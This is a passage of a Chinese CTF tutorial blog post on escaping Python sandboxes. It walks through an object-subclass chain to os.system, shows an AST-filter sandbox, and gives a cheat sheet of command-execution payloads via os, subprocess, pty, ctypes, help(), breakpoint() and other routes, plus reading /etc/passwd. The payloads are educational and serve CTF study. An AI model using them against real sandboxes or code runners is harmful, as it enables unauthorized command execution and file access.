<li><p><code>encode()</code>：在 Python 中，**<code>.encode()</code> 方法是用于字符串的，<u>它返回的是原字符串的字节字符串表示</u>**。在这段代码中，<code>&#39;ls /&#39;.encode()</code> 将字符串 <code>&#39;ls /&#39;</code> 转换成字节字符串。这样做的原因是 <code>ctypes.CDLL().system()</code> 函数需要的参数通常是二进制字符串（在 Python 中是 bytes 类型），而不是普通的字符串（在 Python 中是 str 类型）。</p>
<p><u>当调用python中低级别的系统函数（如C标准库中的函数）时，通常需要用字节字符串作为参数，而不是普通字符串。这是因为底层的 C 函数通常处理的是原始的字节序列，而不是 Python 的 str 对象。</u></p>
</li>
</ul>
<p><strong>对于（2）：</strong></p>
<ul>
<li><p>首先，<code>&#39;&#39;.__class__.__base__.__subclasses__()</code>这段代码获取了Python的<code>object</code>基类的所有子类，返回的是一个列表。这里，<code>&#39;&#39;</code>是一个空字符串，<code>&#39;&#39;.__class__</code>取得其类别，即<code>str</code>，<code>&#39;&#39;.__class__.__base__</code>则进一步取得其基类，即<code>object</code>。在Python中，所有类都起源于<code>object</code>。</p>
</li>
<li><p>然后，针对这个列表进行了遍历。 <code>for x in &#39;&#39;.__class__.__base__.__subclasses__()</code> <strong>这段代码通过 for 循环，把基类 <code>object</code> 的所有子类逐个赋值给变量 <code>x</code>。</strong></p>
</li>
<li><p>接着，<code>if x.__name__==&quot;_wrap_close&quot;</code>这段是一个if判断，<strong>当子类的名字为<code>_wrap_close</code>时，继续下一步。</strong></p>
</li>
<li><p><code>x.__init__.__globals__</code>取得了<code>_wrap_close</code>的初始化函数（<code>__init__</code>方法）的全局变量。因此 <code>x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;</code> 这整段代码的作用是获取了 <code>_wrap_close</code> 初始化函数的全局变量。</p>
</li>
<li><p>然后，<code>[x.__init__.__globals__ for x in &#39;&#39;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0]</code> 中的 <code>[0]</code> 是选取初始化函数全局变量的第一个元素。</p>
</li>
<li><p>最后，<code>[&quot;system&quot;](&quot;ls&quot;)</code> 在第一个元素中查找 <code>system</code> 函数，并执行它，传入的参数是 <code>&quot;ls&quot;</code>。</p>
<p>总的来说，**这段代码的目的是通过获取Python所有类的基类的子类，并遍历寻找”_wrap_close”类（其实就是在找os模块，即<code>&lt;class &#39;os._wrap_close&#39;&gt;</code>），获取其初始化函数的全局变量，从而找到并执行 <code>system(&quot;ls&quot;)</code>**。这样的做法可能是为了绕过直接调用可能被限制的 <code>os.system()</code>。并且执行顺序与Python语言的语法和特性有关。</p>
</li>
</ul>
<h4 id="基于AST的沙箱"><a href="#基于AST的沙箱" class="headerlink" title="基于AST的沙箱"></a>基于AST的沙箱</h4><p>Python的抽象语法树（AST，Abstract Syntax Tree）是一种用来表示Python源代码的树状结构。在这个树状结构中，每个节点都代表源代码中的一种结构，如一个函数调用、一个操作符、一个变量等。Python 的 ast 模块提供了一种机制来解析 Python 源代码并生成这样的抽象语法树。 下面是Python <code>ast</code>模块的一些常见节点类型：</p>
<ul>
<li><code>ast.Module</code>: 表示一个整个的模块或者脚本。</li>
<li><code>ast.FunctionDef</code>: 表示一个函数定义。</li>
<li><code>ast.AsyncFunctionDef</code>: 表示一个异步函数定义。</li>
<li><code>ast.ClassDef</code>: 表示一个类定义。</li>
<li><code>ast.Return</code>: 表示一个return语句。</li>
<li><code>ast.Delete</code>: 表示一个del语句。</li>
<li><code>ast.Assign</code>: 表示一个赋值语句。</li>
<li><code>ast.AugAssign</code>: 表示一个增量赋值语句，如<code>x += 1</code>。</li>
<li><code>ast.For</code>: 表示一个for循环。</li>
<li><code>ast.While</code>: 表示一个while循环。</li>
<li><code>ast.If</code>: 表示一个if语句。</li>
<li><code>ast.With</code>: 表示一个with语句。</li>
<li><code>ast.Raise</code>: 表示一个raise语句。</li>
<li><code>ast.Try</code>: 表示一个try&#x2F;except语句。</li>
<li><code>ast.Import</code>: 表示一个import语句。</li>
<li><code>ast.ImportFrom</code>: 表示一个from…import…语句。</li>
<li><code>ast.Expr</code>: 表示一个表达式。</li>
<li><code>ast.Call</code>: 表示一个函数调用。</li>
<li><code>ast.Name</code>: 表示一个变量名。</li>
<li><code>ast.Attribute</code>: 表示一个属性引用，如<code>x.y</code>。</li>
</ul>
<p>其他类型的节点可在Python官方文档的<code>ast</code>模块部分找到。</p>
<p>一些CTF题目就采用了检查AST节点构建沙箱，下面是一个示例. 在这个示例中, verify_secure 函数对 compile 之后的代码进行校验, 禁止 <code>ast.Import|ast.ImportFrom|ast.Call</code> 这三类操作, <strong>这样一来就无法导入模块和执行函数.</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify_secure</span>(<span class="params">m</span>):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> ast.walk(m):</span><br><span class="line">    <span class="keyword">match</span> <span class="built_in">type</span>(x):</span><br><span class="line">      <span class="keyword">case</span> (ast.Import|ast.ImportFrom|ast.Call):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;ERROR: Banned statement <span class="subst">&#123;x&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">abspath = os.path.abspath(__file__)</span><br><span class="line">dname = os.path.dirname(abspath)</span><br><span class="line">os.chdir(dname)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-- Please enter code (last line must contain only --END)&quot;</span>)</span><br><span class="line">source_code = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  line = sys.stdin.readline()</span><br><span class="line">  <span class="keyword">if</span> line.startswith(<span class="string">&quot;--END&quot;</span>):</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  source_code += line</span><br><span class="line"></span><br><span class="line">tree = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>, flags=ast.PyCF_ONLY_AST)</span><br><span class="line"><span class="keyword">if</span> verify_secure(tree):  <span class="comment"># Safe to execute!</span></span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;-- Executing safe code:&quot;</span>)</span><br><span class="line">  compiled = <span class="built_in">compile</span>(source_code, <span class="string">&quot;input.py&quot;</span>, <span class="string">&#x27;exec&#x27;</span>)</span><br><span class="line">  <span class="built_in">exec</span>(compiled)</span><br></pre></td></tr></table></figure>

<h3 id="逃逸目标"><a href="#逃逸目标" class="headerlink" title="逃逸目标"></a>逃逸目标</h3><p>沙箱逃逸的目标是执行shell、读写文件或者获取环境变量信息等</p>
<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>命令执行可以利用的方法有很多，如下：</p>
<h6 id="commands模块-仅限2-x"><a href="#commands模块-仅限2-x" class="headerlink" title="commands模块(仅限2.x)"></a>commands模块(仅限2.x)</h6><p>在python3中这个模块已经被弃用，注意python版本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> commands</span><br><span class="line"></span><br><span class="line">commands.getoutput(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line">commands.getstatusoutput(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h6 id="timeit模块"><a href="#timeit模块" class="headerlink" title="timeit模块"></a>timeit模块</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> timeit</span><br><span class="line">timeit.timeit(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>,number=<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p><code>timeit</code>模块是Python标准库中的一个用于测量小段Python代码执行时间的工具。</p>
<p><code>timeit.timeit()</code>方法接受两个主要的参数：</p>
<ul>
<li><p>第一个参数是你要度量的代码片段，写作字符串形式。</p>
</li>
<li><p><code>number</code>是一个可选的参数，它定义了你要执行的代码片段的重复次数，即你想运行这段代码多少次。默认值是1000000。</p>
</li>
</ul>
<h6 id="exec函数"><a href="#exec函数" class="headerlink" title="exec函数"></a>exec函数</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;</span>)</span><br></pre></td></tr></table></figure>



<h6 id="eval函数"><a href="#eval函数" class="headerlink" title="eval函数"></a>eval函数</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="string">&quot;__import__(&#x27;os&#x27;).system(&#x27;dir&#x27;)&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>如上eval只能执行一条简单的表达式，如果想使用执行多行代码，就需要使用<code>compile</code>函数并传入exec模式就能实现（上面讲过）：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span>(<span class="built_in">compile</span>(<span class="string">&#x27;__import__(&quot;os&quot;).system(&quot;dir&quot;);print(&quot;haha&quot;)&#x27;</span>,<span class="string">&#x27;&lt;string&gt;&#x27;</span>,<span class="string">&#x27;exec&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><strong>或者使用海象表达式</strong>，下面多行限制那里有说。</p>
<h6 id="platform模块"><a href="#platform模块" class="headerlink" title="platform模块"></a>platform模块</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> platform</span><br><span class="line">platform.sys.modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">或</span><br><span class="line">platform.os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h6 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h6><ul>
<li>os.system</li>
<li>os.popen</li>
<li>os.posix_spawn</li>
<li>os.exec*</li>
<li>os.spawnv</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">os.popen(<span class="string">&quot;ls&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">os.posix_spawn(<span class="string">&quot;/bin/ls&quot;</span>, [<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>], os.environ)</span><br><span class="line"></span><br><span class="line">os.posix_spawn(<span class="string">&quot;/bin/bash&quot;</span>, [<span class="string">&quot;/bin/bash&quot;</span>], os.environ)</span><br><span class="line"></span><br><span class="line">os.spawnv(<span class="number">0</span>,<span class="string">&quot;/bin/ls&quot;</span>, [<span class="string">&quot;/bin/ls&quot;</span>, <span class="string">&quot;-l&quot;</span>])</span><br></pre></td></tr></table></figure>

<p><em><em>os.exec</em>()</em>*</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execl</span></span><br><span class="line">os.execl(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execl(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execle</span></span><br><span class="line">os.execle(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, os.environ)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execle(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execlp</span></span><br><span class="line">os.execlp(<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execle(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execlpe</span></span><br><span class="line">os.execlpe(<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, os.environ)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execlpe(<span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;xx&#x27;</span>, <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execv</span></span><br><span class="line">os.execv(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>])</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execv(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execve</span></span><br><span class="line">os.execve(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>], os.environ)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execve(<span class="string">&#x27;/bin/sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>], <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execvp</span></span><br><span class="line">os.execvp(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>])</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execvp(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># os.execvpe</span></span><br><span class="line">os.execvpe(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>], os.environ)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).execvpe(<span class="string">&#x27;sh&#x27;</span>, [<span class="string">&#x27;xx&#x27;</span>], <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).environ)</span><br></pre></td></tr></table></figure>



<h6 id="subprocess模块"><a href="#subprocess模块" class="headerlink" title="subprocess模块"></a>subprocess模块</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;ls&#x27;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="comment"># python2</span></span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line">subprocess.run(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.getoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">subprocess.getstatusoutput(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">subprocess.call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_call(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.check_output(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line">subprocess.Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;subprocess&#x27;</span>).Popen(<span class="string">&#x27;whoami&#x27;</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<h6 id="pty模块"><a href="#pty模块" class="headerlink" title="pty模块"></a>pty模块</h6><p><strong>pty.spawn</strong></p>
<p>仅限于linux环境</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawn(<span class="string">&quot;ls&quot;</span>)</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;pty&#x27;</span>).spawn(<span class="string">&quot;ls&quot;</span>)</span><br></pre></td></tr></table></figure>

<h6 id="importlib-模块"><a href="#importlib-模块" class="headerlink" title="importlib 模块"></a>importlib 模块</h6><p><code>importlib</code>模块主要被用于动态地在运行时进行导入。也就是说，该模块使开发者能够在程序运行过程中动态地导入和使用模块。这在需要动态改变（或增加）程序的行为时非常有用。例如，根据程序的配置或用户的输入，你可能需要导入和使用不同的模块。</p>
<p>比如，<code>importlib.import_module()</code>函数，这是一个简化了 <code>importlib.__import__()</code>的函数，用户可以通过它动态地导入指定的模块</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;importlib&#x27;</span>).import_module(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="comment"># Python3可以，Python2没有该函数</span></span><br><span class="line">importlib.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h6 id="sys模块"><a href="#sys模块" class="headerlink" title="sys模块"></a>sys模块</h6><p>这个已经比较常见了，该模块通过modules()函数获取os模块并执行命令。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">sys.modules[<span class="string">&#x27;os&#x27;</span>].system(<span class="string">&#x27;dir&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h6 id="builtins-利用"><a href="#builtins-利用" class="headerlink" title="__builtins__利用"></a><code>__builtins__</code>利用</h6><p><code>__builtins__</code>是一个builtins模块的一个引用，其中包含Python的内置名称。这个模块自动在所有模块的全局命名中导入。当然也可以使用 <code>import builtins</code> 来导入</p>
<p><strong>它包含许多基本函数（如 print、len 等）和基本类（如 object、int、list 等）。这就是可以在 Python 脚本中直接使用 print、len、eval 等函数，而无需导入任何模块的原因。</strong></p>
<p>我们可以使用 dir() 查看当前模块的属性列表. 其中就可以看到 <code>__builtins__</code>：<br><img src="/2024/06/02/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240529163826211.png" alt="image-20240529163826211"></p>
<p>内置的函数中 open 与文件操作相关，（python2 中为 file 函数）:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;builtins&quot;</span>).<span class="built_in">open</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure>

<p><code>__builtins__</code>除了读取文件之外还可以通过调用其 <code>__import__</code> 属性来引入别的模块执行命令。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.<span class="built_in">__import__</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>由于每个导入的模块都会留存一个 <code>__builtins__</code> 属性，因此我们可以在任意的模块中通过<code>__builtins__</code>来引入模块或者执行文件操作。需要注意的是，<code>__builtins__</code>在模块级别和全局级别的表现有所不同。</p>
<p>在全局级别（也就是你在Python交互式解释器中直接查看<code>__builtins__</code>时），<code>__builtins__</code>实际上是一个模块<code>&lt;module &#39;__builtin__&#39; (built-in)&gt;</code>。</p>
<p>在模块级别（也就是你在一个Python脚本中查看<code>__builtins__</code>），<code>__builtins__</code>是一个字典，这个字典包含了<code>__builtin__</code>模块中所有的函数和类。</p>
<p>因此，当通过其他模块的 <code>__builtins__</code>时，如<code>__import__(&#39;types&#39;).__builtins__</code>时，实际上看到的是一个字典，包含了所有的内建函数和类。此时调用的方式有所变化。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">__import__</span>(<span class="string">&#x27;types&#x27;</span>).__builtins__[<span class="string">&#x27;__import__&#x27;</span>])</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">__import__</span>&gt;</span><br></pre></td></tr></table></figure>



<h6 id="help函数"><a href="#help函数" class="headerlink" title="help函数"></a>help函数</h6><p>在python中输入 help() 可以得到一个help的交互式窗口，在窗口里面可以输入python内置函数或方法或模块进入相关帮助文档查看他们的用法。而有的帮助文档由于篇幅较长，需要使用分页工具进行分页。在Linux中，less 和 more 都是常用的分页工具。默认情况下，Python 解释器会使用 less 工具来分页显示帮助信息。无论是 less 还是 more 命令，帮助信息过长时，最后一行都会有一个 –MORE– 标识，<strong>这个时候一般在后面输入 <code>!sh</code> ，会进入shell模式，可以执行任意shell指令。</strong></p>
<p>因此在这个方法中可以首先输入 <code>help()</code> ，进入到help界面，然后找个模块，例如 os 输入，此时就会显示 os 模块的帮助页面，输入 <code>!ls</code> 即可进行rce。</p>
<p><strong>比如下方：</strong><br>先输入help()，再输入os，在如下命令执行即可。</p>
<p><img src="/2024/06/02/python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240529204041780.png" alt="image-20240529204041780"></p>
<h6 id="breakpoint函数"><a href="#breakpoint函数" class="headerlink" title="breakpoint函数"></a>breakpoint函数</h6><p>pdb 模块定义了一个交互式源代码调试器，用于Python程序。它支持在源码行间设置（有条件的）断电和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文运行任意Python代码。它还支持事后调试，可以在程序控制下调用。</p>
<p>在输入 <code>breakpoint()</code>后可以打开pdb代码调试器，在其中就可以执行任意python代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="built_in">breakpoint</span>()</span><br><span class="line">--Return--</span><br><span class="line">&gt; &lt;string&gt;(<span class="number">1</span>)&lt;module&gt;()-&gt;<span class="literal">None</span></span><br><span class="line">(Pdb) <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>).read()</span><br><span class="line"><span class="string">&#x27;flag=NSSCTF&#123;73ddf7db-40d6-4514-a76b-08303756ddba&#125;\n&#x27;</span></span><br><span class="line">(Pdb) </span><br></pre></td></tr></table></figure>

<h6 id="ctypes"><a href="#ctypes" class="headerlink" title="ctypes"></a>ctypes</h6><p>这个在上面那个<code>audit hook 的沙箱</code>那里的payload已经说过了，就是一个外部函数库，用法如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">libc = ctypes.CDLL(<span class="literal">None</span>)</span><br><span class="line">libc.system(<span class="string">&#x27;ls ./&#x27;</span>.encode())  <span class="comment"># 使用 encode() 方法将字符串转换为字节字符串</span></span><br><span class="line"></span><br><span class="line">即</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;ctypes&#x27;</span>).CDLL(<span class="literal">None</span>).system(<span class="string">&#x27;ls /&#x27;</span>.encode())</span><br></pre></td></tr></table></figure>

<h6 id="threading"><a href="#threading" class="headerlink" title="threading"></a>threading</h6><p>可以<strong>创建新线程</strong>，从而利用新的线程来执行函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">t = threading.Thread(target=func)</span><br><span class="line">t.start()</span><br><span class="line"></span><br><span class="line">用于题目：</span><br><span class="line"><span class="comment"># eval, exec 都可以执行的版本</span></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;threading&#x27;</span>).Thread(target=<span class="keyword">lambda</span>: <span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)).start()</span><br><span class="line"><span class="comment"># exec可执行</span></span><br><span class="line"><span class="keyword">import</span> threading,os; threading.Thread(target=<span class="keyword">lambda</span>: os.system(<span class="string">&#x27;ls&#x27;</span>)).start()</span><br></pre></td></tr></table></figure>

<p><strong>新线程是并行运行的，并不会阻止程序的主线程或其他线程的执行</strong>。线程可以用来执行后台任务，如计算密集型任务或I&#x2F;O操作，而不会阻塞程序的其他部分。</p>
